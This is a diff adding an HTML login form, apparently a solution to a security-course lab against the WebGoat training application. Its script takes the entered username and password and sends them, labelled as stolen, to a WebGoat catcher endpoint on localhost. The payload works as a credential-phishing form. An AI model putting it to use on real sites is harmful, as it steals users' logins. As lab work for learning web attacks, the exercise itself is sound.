@@ -1,0 +1,31 @@
+<body>
+    <br>
+    <form id="phishForm">
+        <label for="ece568-25s-username">Username:</label>
+        <input type="text" id="ece568-25s-username" placeholder="Username"><br><br>
+        
+        <label for="ece568-25s-password">Password:</label>
+        <input type="password" id="ece568-25s-password" placeholder="Password"><br><br>
+        
+        <!-- This button calls the phish() function on click -->
+        <button type="button" id="ece568-25s-submit" onclick="submitFunction(event)">Login</button>
+    </form>
+
+    <script>
+        async function submitFunction(e) {
+            e.preventDefault();
+            const username = document.getElementById("ece568-25s-username").value;
+            const password = document.getElementById("ece568-25s-password").value;
+            let formData = new FormData(document.forms[0]);
+            formData.set("stolen-username", username);
+            formData.set("stolen-password", password);
+            const url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes" +
+                        "&stolen-username=" + encodeURIComponent(username) +
+                        "&stolen-password=" + encodeURIComponent(password);
+            const response = await fetch(url, {
+              method: "POST",
+              body: formData
+            });
+          }
+    </script>
+</body>
